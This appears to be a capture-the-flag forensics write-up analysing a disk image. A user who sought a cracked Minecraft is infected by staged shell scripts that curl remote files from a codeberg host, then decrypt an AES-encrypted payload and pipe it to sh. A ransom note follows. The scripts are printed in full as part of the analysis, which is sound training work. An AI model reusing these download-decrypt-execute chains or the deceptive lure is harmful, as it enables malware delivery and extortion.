# Free Minecraft

<details>
  
  <summary> <b> Description </b> </summary>

- **Category**: `Forensics (Disk Imaging)`

- **Author**: `Devobass`
    
- **Tools**: `FTK Imager`, `DB Browser SQLite`

</details>

We are presented with `disk.img.xz` and `hash.txt`. Let's analyse the disk image with FTK Imager.

*File > Add Evidence Item > Image File > Next > Browse the source path > Finish*

Upon wandering around in the `home` folder, I found some sussy stuff:

<img width="959" height="562" alt="image" src="https://github.com/user-attachments/assets/293ef349-163e-4bfc-adae-1a163f7b7285" />

Right-click the text and modify the encoding to UTF-8: 

`Ваши файлы зашифрованы, для расшифровки отправьте $36000 на 12345678910 TCB`

Which is translated into:

`Your files are encrypted; to decrypt them, send $36,000 to 12345678910 TCB`. 

Wandering around for more, there is a symlink called `minecrap` containing `/tmp/downloader.sh`

<img width="959" height="562" alt="image" src="https://github.com/user-attachments/assets/34272f18-ade6-4c8f-8487-abde40440f59" />

From these two file, we can infer that our `cool_user` is infected with ransomware while attempting to crack the game Minecraft and downloading from untrusted source from the Internet.

I suppose we would like to trace back the downloader. Unfortunately, `/tmp` is empty, since it is self-destructive. But we can look up the user's browser history to retrieve what was lost. We can see that the user is using the browser Mozilla Firefox. After doing some research on the whereabouts of Firefox history on Linux, I found:

<img width="959" height="560" alt="image" src="https://github.com/user-attachments/assets/32fe6bf7-7524-4b7b-96da-8bcb55af3b6e" />

<img width="957" height="473" alt="image" src="https://github.com/user-attachments/assets/11601440-14eb-41fc-a2e9-765e8726cde9" />

All roads lead to `places.sqlite`.

<img width="959" height="563" alt="image" src="https://github.com/user-attachments/assets/04897196-8226-4a78-b383-353791749a53" />

Export this file, and then we need a SQLite Browser to read this file. Go to File > Open Database > Choose the file > Browse Data. Click on different tables to view them, and the one with the name `moz.places` reveals more sussy stuff:

<img width="958" height="564" alt="image" src="https://github.com/user-attachments/assets/d2b8d0ed-fc1c-4f7e-ab06-a64a11b9947a" />

We have a website and a youtube link. Apparently, the user has followed the guide to download "Free Minecraft"

<img width="959" height="533" alt="image" src="https://github.com/user-attachments/assets/9d2cf437-faa5-4f92-8aca-a9f053f870d8" />

Follow the `codeberg` link, a platform similar to Github, we are presented with four shell script files which was fetched to the bash:

<img width="959" height="565" alt="image" src="https://github.com/user-attachments/assets/65996ad4-fe87-4e8b-9ebf-2901ab3a5878" />

- `download-minecrap.sh`
```
#!/usr/bin/env sh

printf "Hang tight while were downloading minecrap for you!\n"
curl -s "https://codeberg.org/evil-guy-on-the-internet/pages/raw/branch/main/file/downloader.sh" --output "/tmp/downloader.sh"
chmod 777 "/tmp/downloader.sh"
ln -s "/tmp/downloader.sh" "$HOME/minecrap"
sleep 2
printf "done!\n"
```

This sets up the deceptive phase while fetching 


- `downloader.sh`
```
#!/usr/bin/env sh

export AES_KEY="nowsyourchancetobeabigshot"

curl -s "https://codeberg.org/evil-guy-on-the-internet/pages/raw/branch/main/file/decrypter.sh" --output "/tmp/decrypter.sh" 
sh "/tmp/decrypter.sh" &

printf "Downlaoding libraries...\n"
sleep 2

printf "Downlaoding jutjutsu kaisen mod apk unlimited money...\n"
sleep 2

printf "Downlaoding shaders with no lag 2019...\n"
sleep 2

printf "Downlaoding minecrap.exe from mahjong...\n"
sleep 2

printf "404 FILE NOT FOUND\n"
sleep 1

printf "Sorry your Minecrap is not available right naow, plaese try agian later."
```

- `decrypter.sh`
```
#!/usr/bin/env sh

SEED="$(printf $AES_KEY | sha256sum)"
KEY="$(printf $SEED | cut -c 1-32)"
IV="$(printf $SEED | cut -c 33-64)"

SEED_R="$(printf "$USER-$(hostname)" | sha256sum)"
export KEY_R="$(printf $SEED_R | cut -c 1-32)"
export IV_R="$(printf $SEED_R | cut -c 33-64)"

curl -s "https://codeberg.org/evil-guy-on-the-internet/pages/raw/branch/main/file/ransom.sh" | xxd -r -p | openssl enc -d -aes-128-cbc -K "$KEY" -iv "$IV" | sh > /dev/null 2>&1

printf 'Ваши файлы зашифрованы, для расшифровки отправьте $36000 на 12345678910 TCB' > "ransom_note_$USER.txt"
```



- `ransom.sh`
```
823e674b58b8dd29cd35848d171e6fd54ae471c9409c4173858112a8575b4d8ca6ab32ed96f95fe7f5a532f6f2f41b9c5ecd466026d9ce51e3f60ff4107522fb04a6ff8bd464acfe487b2b9dec310d2975cdcaba1fdf71efa945162ea0c6021744c385f3388eb94234c07fca7437787dd9ebf91f9074e13d7b3a526ac2c53dcf1d95f9292990dd3f49d13b3126162e629ad740204c3fd90b468d851a216683a210130534c6bf9744fae78fee3b75c83c562712d58dcfc7051dcc38e1a702c2dbe7434911a9229b1778e6935d6bbacab428103be2fa4a8c056eb83251245a5d6fa2be2af2defa3bba0e921ff7fac6b04c5ea116b858186387bf4b1151db014e7918fa3bb400d7c182f994fc7d3020000029f70bc97d99986f22feb6754e1ad172818b8fa34f7a6cacfcc4bca9f090a69a086b36c0436b4c751bc4ede0f87ada77f5ff5a3b90bb291fbbf87ca400fc3d0af2facc1ee435bfd31593b36a21e7de4477772dee3a9ff933966cbc52a1dd2f696a0e6a37249da613411ce8417f3a4dc1fea753464d46c0cb268ff992b6d716819b306b345402a482ccbd63c4ab5232851dfb668d630ff70d95300357e47f5614b2f3d5b9c4239359773f1129cf5850dad53373db300bde5cdf9407ca453894fe33b296c6b7188301d76ccfcf1b320cd7c482bf74e8b606aabd9b3485494bc82b65e926a8cb183d5be72f086a392585907751b2979f7cdaa2ec91f51bc06cbe8249accd930174a5271b21a870be349a3a59b729572d53dd40db6bcf5f92a6622d7aa391734cf246ced5e72c71e71ab953cdca3ec942a256f21be095834432975498b6015cbdc3f19439238ca001e0ad4d27b1f6b42920a19f4db0f1c994cc03e670d2d83e83dbc8b2bf304b6bd17696111c7ffa401607cccc6b488a4f64032b4e9ff944a18342486c43f7fe86e909da32
```






